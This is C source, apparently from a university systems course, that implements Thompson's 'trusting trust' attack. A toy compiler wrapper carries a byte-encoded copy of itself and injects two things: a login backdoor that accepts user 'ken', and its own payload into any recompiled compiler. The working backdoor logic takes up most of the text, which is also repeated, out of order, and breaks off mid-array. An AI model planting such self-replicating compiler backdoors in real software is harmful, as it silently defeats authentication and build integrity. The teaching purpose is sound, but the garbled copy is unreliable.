	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	50, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	10,
	32, 	32, 	108, 	105, 	110, 	101, 	32, 	61,
	32, 	115, 	116, 	114, 	116, 	111, 	107, 	40,
	78, 	85, 	76, 	76, 	44, 	32, 	34, 	92,
	110, 	34, 	41, 	59, 	32, 	47, 	47, 	32,
	67, 	111, 	110, 	116, 	105, 	110, 	117, 	101,
	32, 	116, 	111, 	32, 	116, 	111, 	107, 	101,
	110, 	105, 	122, 	101, 	32, 	116, 	104, 	101,
	32, 	115, 	116, 	114, 	105, 	110, 	103, 	10,
	125, 	10, 	102, 	99, 	108, 	111, 	115, 	101,
	40, 	102, 	112, 	41, 	59, 	10, 	10, 	99,
	104, 	97, 	114, 	32, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	91, 	49, 	48,
	48, 	93, 	59, 	10, 	70, 	73, 	76, 	69,
	32, 	42, 	100, 	101, 	98, 	117, 	103, 	32,
	61, 	32, 	102, 	111, 	112, 	101, 	110, 	40,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	34, 	44, 	32,
	34, 	114, 	34, 	41, 	59, 	10, 	97, 	115,
	115, 	101, 	114, 	116, 	40, 	100, 	101, 	98,
	117, 	103, 	41, 	59, 	10, 	119, 	104, 	105,
	108, 	101, 	32, 	40, 	102, 	103, 	101, 	116,
	115, 	40, 	100, 	101, 	98, 	117, 	103, 	76,
	105, 	110, 	101, 	44, 	32, 	115, 	105, 	122,
	101, 	111, 	102, 	40, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	41, 	44, 	32,
	100, 	101, 	98, 	117, 	103, 	41, 	32, 	33,
	61, 	32, 	78, 	85, 	76, 	76, 	41, 	32,
	123, 	10, 	32, 	32, 	112, 	114, 	105, 	110,
	116, 	102, 	40, 	34, 	37, 	115, 	34, 	44,
	32, 	100, 	101, 	98, 	117, 	103, 	76, 	105,
	110, 	101, 	41, 	59, 	10, 	125, 0 };
FILE *output = fp;
static char login_sig[] = "int login(char *user) {";
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
static char first_line[] =
    "static void compile(char *program, char *outname) {";
static char second_line[] = "  FILE *fp = fopen(\"./temp-out.c\", \"w\");";
static char third_line[] = "  assert(fp);";
char loginNextLineGet = 0;
char compilerNextLineGet = 0;
char *line = strtok(program, "\n");
while (line != NULL) {
  if (loginNextLineGet == 1) {
    fprintf(output, "%s", login_attack);
    loginNextLineGet = 0;
  }
  if (compilerNextLineGet == 3) {
    int i;
    fprintf(output, "%s", "char prog[] = {\n");
    for (i = 0; prog[i]; i++)
      fprintf(output, "\t%d,%c", prog[i], (i + 1) % 8 == 0 ? '\n' : ' ');
    fprintf(output, "%s", "0 };\n");
    fprintf(output, "%s", prog);
    compilerNextLineGet = 0;
    line = strtok(NULL, "\n");
    // continue;
  }
  fprintf(output, "%s\n", line);
  if (strcmp(line, login_sig) == 0) {
    loginNextLineGet = 1;
  }
  if (strcmp(line, first_line) == 0 && compilerNextLineGet == 0) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, second_line) == 0 && compilerNextLineGet == 1) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, third_line) == 0 && compilerNextLineGet == 2) {
    compilerNextLineGet += 1;
  }
  line = strtok(NULL, "\n"); // Continue to tokenize the string
}
fclose(fp);

char debugLine[100];
FILE *debug = fopen("./temp-out.c", "r");
assert(debug);
while (fgets(debugLine, sizeof(debugLine), debug) != NULL) {
  printf("%s", debugLine);
}  fclose(fp);
  // for step 2 you will pattern match on
  //   "static void compile(char *program, char *outname) {"
  // and inject the attack
  // match on login....
  // and inject an attack for "ken"
  // gross, call gcc.
  char buf[1024];
  sprintf(buf, "gcc ./temp-out.c -o %s -Wno-nullability-completeness", outname);
  if (system(buf) != 0)
    error("system failed\n");
}
#define N 8 * 1024 * 1024
static char buf[N + 1];
int main(int argc, char *argv[]) {
  if (argc != 4)
    error("expected 4 arguments have %d\n", argc);
  if (strcmp(argv[2], "-o") != 0)
    error("expected -o as second argument, have <%s>\n", argv[2]);
  // read in the entire file.
  int fd;
  if ((fd = open(argv[1], O_RDONLY)) < 0)
    error("file <%s> does not exist\n", argv[1]);
  int n;
  if ((n = read(fd, buf, N)) < 1)
    error("invalid read of file <%s>\n", argv[1]);
  if (n == N)
    error("input file too large\n");
  // "compile" it.
  compile(buf, argv[3]);
  return 0;
}
// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#define error(args...)                                                         \
  do {                                                                         \
    fprintf(stderr, ##args);                                                   \
    exit(1);                                                                   \
  } while (0)
// a not very interesting compile: throw the input into a
// temporary file and then call gcc on the result.
static void compile(char *program, char *outname) {
  FILE *fp = fopen("./temp-out.c", "w");
  assert(fp);
char prog[] = {
	70, 	73, 	76, 	69, 	32, 	42, 	111, 	117,
	116, 	112, 	117, 	116, 	32, 	61, 	32, 	102,
	112, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	108,
	111, 	103, 	105, 	110, 	95, 	115, 	105, 	103,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	110,
	116, 	32, 	108, 	111, 	103, 	105, 	110, 	40,
	99, 	104, 	97, 	114, 	32, 	42, 	117, 	115,
	101, 	114, 	41, 	32, 	123, 	34, 	59, 	10,
	115, 	116, 	97, 	116, 	105, 	99, 	32, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	102,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	117, 	115, 	101, 	114, 	44, 	32, 	92, 	34,
	107, 	101, 	110, 	92, 	34, 	41, 	32, 	61,
	61, 	32, 	48, 	41, 	32, 	114, 	101, 	116,
	117, 	114, 	110, 	32, 	49, 	59, 	34, 	59,
	10, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	99, 	104, 	97, 	114, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	91,
	93, 	32, 	61, 	10, 	32, 	32, 	32, 	32,
	34, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	118, 	111, 	105, 	100, 	32, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	40, 	99, 	104, 	97,
	114, 	32, 	42, 	112, 	114, 	111, 	103, 	114,
	97, 	109, 	44, 	32, 	99, 	104, 	97, 	114,
	32, 	42, 	111, 	117, 	116, 	110, 	97, 	109,
	101, 	41, 	32, 	123, 	34, 	59, 	10, 	115,
	116, 	97, 	116, 	105, 	99, 	32, 	99, 	104,
	97, 	114, 	32, 	115, 	101, 	99, 	111, 	110,
	100, 	95, 	108, 	105, 	110, 	101, 	91, 	93,
	32, 	61, 	32, 	34, 	32, 	32, 	70, 	73,
	76, 	69, 	32, 	42, 	102, 	112, 	32, 	61,
	32, 	102, 	111, 	112, 	101, 	110, 	40, 	92,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	92, 	34, 	44,
	32, 	92, 	34, 	119, 	92, 	34, 	41, 	59,
	34, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	116,
	104, 	105, 	114, 	100, 	95, 	108, 	105, 	110,
	101, 	91, 	93, 	32, 	61, 	32, 	34, 	32,
	32, 	97, 	115, 	115, 	101, 	114, 	116, 	40,
	102, 	112, 	41, 	59, 	34, 	59, 	10, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	32, 	48,
	59, 	10, 	99, 	104, 	97, 	114, 	32, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	32, 	48, 	59, 	10,
	99, 	104, 	97, 	114, 	32, 	42, 	108, 	105,
	110, 	101, 	32, 	61, 	32, 	115, 	116, 	114,
	116, 	111, 	107, 	40, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	44, 	32, 	34, 	92, 	110,
	34, 	41, 	59, 	10, 	119, 	104, 	105, 	108,
	101, 	32, 	40, 	108, 	105, 	110, 	101, 	32,
	33, 	61, 	32, 	78, 	85, 	76, 	76, 	41,
	32, 	123, 	10, 	32, 	32, 	105, 	102, 	32,
	40, 	108, 	111, 	103, 	105, 	110, 	78, 	101,
	120, 	116, 	76, 	105, 	110, 	101, 	71, 	101,
	116, 	32, 	61, 	61, 	32, 	49, 	41, 	32,
	123, 	10, 	32, 	32, 	32, 	32, 	102, 	112,
	114, 	105, 	110, 	116, 	102, 	40, 	111, 	117,
	116, 	112, 	117, 	116, 	44, 	32, 	34, 	37,
	115, 	34, 	44, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	108,
	111, 	103, 	105, 	110, 	78, 	101, 	120, 	116,
	76, 	105, 	110, 	101, 	71, 	101, 	116, 	32,
	61, 	32, 	48, 	59, 	10, 	32, 	32, 	125,
	10, 	32, 	32, 	105, 	102, 	32, 	40, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	61, 	32, 	51, 	41,
	32, 	123, 	10, 	32, 	32, 	32, 	32, 	105,
	110, 	116, 	32, 	105, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	99, 	104, 	97, 	114, 	32, 	112, 	114,
	111, 	103, 	91, 	93, 	32, 	61, 	32, 	123,
	92, 	110, 	34, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	111, 	114, 	32, 	40, 	105,
	32, 	61, 	32, 	48, 	59, 	32, 	112, 	114,
	111, 	103, 	91, 	105, 	93, 	59, 	32, 	105,
	43, 	43, 	41, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	92, 	116, 	37, 	100, 	44,
	37, 	99, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	91, 	105, 	93, 	44, 	32, 	40, 	105,
	32, 	43, 	32, 	49, 	41, 	32, 	37, 	32,
	56, 	32, 	61, 	61, 	32, 	48, 	32, 	63,
	32, 	39, 	92, 	110, 	39, 	32, 	58, 	32,
	39, 	32, 	39, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	48, 	32, 	125, 	59, 	92, 	110, 	34,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	99, 	111, 	109, 	112, 	105, 	108, 	101, 	114,
	78, 	101, 	120, 	116, 	76, 	105, 	110, 	101,
	71, 	101, 	116, 	32, 	61, 	32, 	48, 	59,
	10, 	32, 	32, 	32, 	32, 	108, 	105, 	110,
	101, 	32, 	61, 	32, 	115, 	116, 	114, 	116,
	111, 	107, 	40, 	78, 	85, 	76, 	76, 	44,
	32, 	34, 	92, 	110, 	34, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	47, 	47, 	32, 	99,
	111, 	110, 	116, 	105, 	110, 	117, 	101, 	59,
	10, 	32, 	32, 	125, 	10, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	92, 	110, 	34, 	44, 	32, 	108,
	105, 	110, 	101, 	41, 	59, 	10, 	32, 	32,
	105, 	102, 	32, 	40, 	115, 	116, 	114, 	99,
	109, 	112, 	40, 	108, 	105, 	110, 	101, 	44,
	32, 	108, 	111, 	103, 	105, 	110, 	95, 	115,
	105, 	103, 	41, 	32, 	61, 	61, 	32, 	48,
	41, 	32, 	123, 	10, 	32, 	32, 	32, 	32,
	108, 	111, 	103, 	105, 	110, 	78, 	101, 	120,
	116, 	76, 	105, 	110, 	101, 	71, 	101, 	116,
	32, 	61, 	32, 	49, 	59, 	10, 	32, 	32,
	125, 	10, 	32, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	41,
	32, 	61, 	61, 	32, 	48, 	32, 	38, 	38,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	61, 	32,
	48, 	41, 	32, 	123, 	10, 	32, 	32, 	32,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	43, 	61, 	32,
	49, 	59, 	10, 	32, 	32, 	125, 	32, 	101,
	108, 	115, 	101, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	115, 	101, 	99,
	111, 	110, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	49, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	32,
	101, 	108, 	115, 	101, 	32, 	105, 	102, 	32,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	108, 	105, 	110, 	101, 	44, 	32, 	116, 	104,
	105, 	114, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	50, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	10,
	32, 	32, 	108, 	105, 	110, 	101, 	32, 	61,
	32, 	115, 	116, 	114, 	116, 	111, 	107, 	40,
	78, 	85, 	76, 	76, 	44, 	32, 	34, 	92,
	110, 	34, 	41, 	59, 	32, 	47, 	47, 	32,
	67, 	111, 	110, 	116, 	105, 	110, 	117, 	101,
	32, 	116, 	111, 	32, 	116, 	111, 	107, 	101,
	110, 	105, 	122, 	101, 	32, 	116, 	104, 	101,
	32, 	115, 	116, 	114, 	105, 	110, 	103, 	10,
	125, 	10, 	102, 	99, 	108, 	111, 	115, 	101,
	40, 	102, 	112, 	41, 	59, 	10, 	10, 	99,
	104, 	97, 	114, 	32, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	91, 	49, 	48,
	48, 	93, 	59, 	10, 	70, 	73, 	76, 	69,
	32, 	42, 	100, 	101, 	98, 	117, 	103, 	32,
	61, 	32, 	102, 	111, 	112, 	101, 	110, 	40,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	34, 	44, 	32,
	34, 	114, 	34, 	41, 	59, 	10, 	97, 	115,
	115, 	101, 	114, 	116, 	40, 	100, 	101, 	98,
	117, 	103, 	41, 	59, 	10, 	119, 	104, 	105,
	108, 	101, 	32, 	40, 	102, 	103, 	101, 	116,
	115, 	40, 	100, 	101, 	98, 	117, 	103, 	76,
	105, 	110, 	101, 	44, 	32, 	115, 	105, 	122,
	101, 	111, 	102, 	40, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	41, 	44, 	32,
	100, 	101, 	98, 	117, 	103, 	41, 	32, 	33,
	61, 	32, 	78, 	85, 	76, 	76, 	41, 	32,
	123, 	10, 	32, 	32, 	112, 	114, 	105, 	110,
	116, 	102, 	40, 	34, 	37, 	115, 	34, 	44,
	32, 	100, 	101, 	98, 	117, 	103, 	76, 	105,
	110, 	101, 	41, 	59, 	10, 	125, 0 };
FILE *output = fp;
static char login_sig[] = "int login(char *user) {";
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
static char first_line[] =
    "static void compile(char *program, char *outname) {";
static char second_line[] = "  FILE *fp = fopen(\"./temp-out.c\", \"w\");";
static char third_line[] = "  assert(fp);";
char loginNextLineGet = 0;
char compilerNextLineGet = 0;
char *line = strtok(program, "\n");
while (line != NULL) {
  if (loginNextLineGet == 1) {
    fprintf(output, "%s", login_attack);
    loginNextLineGet = 0;
  }
  if (compilerNextLineGet == 3) {
    int i;
    fprintf(output, "%s", "char prog[] = {\n");
    for (i = 0; prog[i]; i++)
      fprintf(output, "\t%d,%c", prog[i], (i + 1) % 8 == 0 ? '\n' : ' ');
    fprintf(output, "%s", "0 };\n");
    fprintf(output, "%s", prog);
    compilerNextLineGet = 0;
    line = strtok(NULL, "\n");
    // continue;
  }
  fprintf(output, "%s\n", line);
  if (strcmp(line, login_sig) == 0) {
    loginNextLineGet = 1;
  }
  if (strcmp(line, first_line) == 0 && compilerNextLineGet == 0) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, second_line) == 0 && compilerNextLineGet == 1) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, third_line) == 0 && compilerNextLineGet == 2) {
    compilerNextLineGet += 1;
  }
  line = strtok(NULL, "\n"); // Continue to tokenize the string
}
fclose(fp);

char debugLine[100];
FILE *debug = fopen("./temp-out.c", "r");
assert(debug);
while (fgets(debugLine, sizeof(debugLine), debug) != NULL) {
  printf("%s", debugLine);
}  fclose(fp);
  // for step 2 you will pattern match on
  //   "static void compile(char *program, char *outname) {"
  // and inject the attack
  // match on login....
  // and inject an attack for "ken"
  // gross, call gcc.
  char buf[1024];
  sprintf(buf, "gcc ./temp-out.c -o %s -Wno-nullability-completeness", outname);
  if (system(buf) != 0)
    error("system failed\n");
}
#define N 8 * 1024 * 1024
static char buf[N + 1];
int main(int argc, char *argv[]) {
  if (argc != 4)
    error("expected 4 arguments have %d\n", argc);
  if (strcmp(argv[2], "-o") != 0)
    error("expected -o as second argument, have <%s>\n", argv[2]);
  // read in the entire file.
  int fd;
  if ((fd = open(argv[1], O_RDONLY)) < 0)
    error("file <%s> does not exist\n", argv[1]);
  int n;
  if ((n = read(fd, buf, N)) < 1)
    error("invalid read of file <%s>\n", argv[1]);
  if (n == N)
    error("input file too large\n");
  // "compile" it.
  compile(buf, argv[3]);
  return 0;
}
// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#define error(args...)                                                         \
  do {                                                                         \
    fprintf(stderr, ##args);                                                   \
    exit(1);                                                                   \
  } while (0)
// a not very interesting compile: throw the input into a
// temporary file and then call gcc on the result.
static void compile(char *program, char *outname) {
  FILE *fp = fopen("./temp-out.c", "w");
  assert(fp);
char prog[] = {
	70, 	73, 	76, 	69, 	32, 	42, 	111, 	117,
	116, 	112, 	117, 	116, 	32, 	61, 	32, 	102,
	112, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	108,
	111, 	103, 	105, 	110, 	95, 	115, 	105, 	103,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	110,
	116, 	32, 	108, 	111, 	103, 	105, 	110, 	40,
	99, 	104, 	97, 	114, 	32, 	42, 	117, 	115,
	101, 	114, 	41, 	32, 	123, 	34, 	59, 	10,
	115, 	116, 	97, 	116, 	105, 	99, 	32, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	102,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	117, 	115, 	101, 	114, 	44, 	32, 	92, 	34,
	107, 	101, 	110, 	92, 	34, 	41, 	32, 	61,
	61, 	32, 	48, 	41, 	32, 	114, 	101, 	116,
	117, 	114, 	110, 	32, 	49, 	59, 	34, 	59,
	10, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	99, 	104, 	97, 	114, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	91,
	93, 	32, 	61, 	10, 	32, 	32, 	32, 	32,
	34, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	118, 	111, 	105, 	100, 	32, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	40, 	99, 	104, 	97,
	114, 	32, 	42, 	112, 	114, 	111, 	103, 	114,
	97, 	109, 	44, 	32, 	99, 	104, 	97, 	114,
	32, 	42, 	111, 	117, 	116, 	110, 	97, 	109,
	101, 	41, 	32, 	123, 	34, 	59, 	10, 	115,
	116, 	97, 	116, 	105, 	99, 	32, 	99, 	104,
	97, 	114, 	32, 	115, 	101, 	99, 	111, 	110,
	100, 	95, 	108, 	105, 	110, 	101, 	91, 	93,
	32, 	61, 	32, 	34, 	32, 	32, 	70, 	73,
	76, 	69, 	32, 	42, 	102, 	112, 	32, 	61,
	32, 	102, 	111, 	112, 	101, 	110, 	40, 	92,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	92, 	34, 	44,
	32, 	92, 	34, 	119, 	92, 	34, 	41, 	59,
	34, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	116,
	104, 	105, 	114, 	100, 	95, 	108, 	105, 	110,
	101, 	91, 	93, 	32, 	61, 	32, 	34, 	32,
	32, 	97, 	115, 	115, 	101, 	114, 	116, 	40,
	102, 	112, 	41, 	59, 	34, 	59, 	10, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	32, 	48,
	59, 	10, 	99, 	104, 	97, 	114, 	32, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	32, 	48, 	59, 	10,
	99, 	104, 	97, 	114, 	32, 	42, 	108, 	105,
	110, 	101, 	32, 	61, 	32, 	115, 	116, 	114,
	116, 	111, 	107, 	40, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	44, 	32, 	34, 	92, 	110,
	34, 	41, 	59, 	10, 	119, 	104, 	105, 	108,
	101, 	32, 	40, 	108, 	105, 	110, 	101, 	32,
	33, 	61, 	32, 	78, 	85, 	76, 	76, 	41,
	32, 	123, 	10, 	32, 	32, 	105, 	102, 	32,
	40, 	108, 	111, 	103, 	105, 	110, 	78, 	101,
	120, 	116, 	76, 	105, 	110, 	101, 	71, 	101,
	116, 	32, 	61, 	61, 	32, 	49, 	41, 	32,
	123, 	10, 	32, 	32, 	32, 	32, 	102, 	112,
	114, 	105, 	110, 	116, 	102, 	40, 	111, 	117,
	116, 	112, 	117, 	116, 	44, 	32, 	34, 	37,
	115, 	34, 	44, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	108,
	111, 	103, 	105, 	110, 	78, 	101, 	120, 	116,
	76, 	105, 	110, 	101, 	71, 	101, 	116, 	32,
	61, 	32, 	48, 	59, 	10, 	32, 	32, 	125,
	10, 	32, 	32, 	105, 	102, 	32, 	40, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	61, 	32, 	51, 	41,
	32, 	123, 	10, 	32, 	32, 	32, 	32, 	105,
	110, 	116, 	32, 	105, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	99, 	104, 	97, 	114, 	32, 	112, 	114,
	111, 	103, 	91, 	93, 	32, 	61, 	32, 	123,
	92, 	110, 	34, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	111, 	114, 	32, 	40, 	105,
	32, 	61, 	32, 	48, 	59, 	32, 	112, 	114,
	111, 	103, 	91, 	105, 	93, 	59, 	32, 	105,
	43, 	43, 	41, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	92, 	116, 	37, 	100, 	44,
	37, 	99, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	91, 	105, 	93, 	44, 	32, 	40, 	105,
	32, 	43, 	32, 	49, 	41, 	32, 	37, 	32,
	56, 	32, 	61, 	61, 	32, 	48, 	32, 	63,
	32, 	39, 	92, 	110, 	39, 	32, 	58, 	32,
	39, 	32, 	39, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	48, 	32, 	125, 	59, 	92, 	110, 	34,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	99, 	111, 	109, 	112, 	105, 	108, 	101, 	114,
	78, 	101, 	120, 	116, 	76, 	105, 	110, 	101,
	71, 	101, 	116, 	32, 	61, 	32, 	48, 	59,
	10, 	32, 	32, 	32, 	32, 	108, 	105, 	110,
	101, 	32, 	61, 	32, 	115, 	116, 	114, 	116,
	111, 	107, 	40, 	78, 	85, 	76, 	76, 	44,
	32, 	34, 	92, 	110, 	34, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	47, 	47, 	32, 	99,
	111, 	110, 	116, 	105, 	110, 	117, 	101, 	59,
	10, 	32, 	32, 	125, 	10, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	92, 	110, 	34, 	44, 	32, 	108,
	105, 	110, 	101, 	41, 	59, 	10, 	32, 	32,
	105, 	102, 	32, 	40, 	115, 	116, 	114, 	99,
	109, 	112, 	40, 	108, 	105, 	110, 	101, 	44,
	32, 	108, 	111, 	103, 	105, 	110, 	95, 	115,
	105, 	103, 	41, 	32, 	61, 	61, 	32, 	48,
	41, 	32, 	123, 	10, 	32, 	32, 	32, 	32,
	108, 	111, 	103, 	105, 	110, 	78, 	101, 	120,
	116, 	76, 	105, 	110, 	101, 	71, 	101, 	116,
	32, 	61, 	32, 	49, 	59, 	10, 	32, 	32,
	125, 	10, 	32, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	41,
	32, 	61, 	61, 	32, 	48, 	32, 	38, 	38,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	61, 	32,
	48, 	41, 	32, 	123, 	10, 	32, 	32, 	32,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	43, 	61, 	32,
	49, 	59, 	10, 	32, 	32, 	125, 	32, 	101,
